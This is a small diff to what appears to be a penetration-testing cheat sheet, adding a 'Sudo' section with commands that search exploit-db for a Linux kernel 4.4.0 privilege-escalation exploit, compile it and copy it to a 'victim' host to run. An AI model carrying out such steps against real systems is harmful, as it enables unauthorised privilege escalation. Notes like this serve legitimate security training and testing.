@@ -47,7 +47,12 @@ ls -asl /usr/bin/somebin
 ## Sudo
 
 ```
-
+searchsploit -u
+searchsploit "Linux kernel 4.4.0 privilege escalation"
+cp /usr/share/exploitdb/exploits/linux/local/num.c .
+gcc num.c
+scp num.c victim@IP:
+./a.out
 ```
 
 
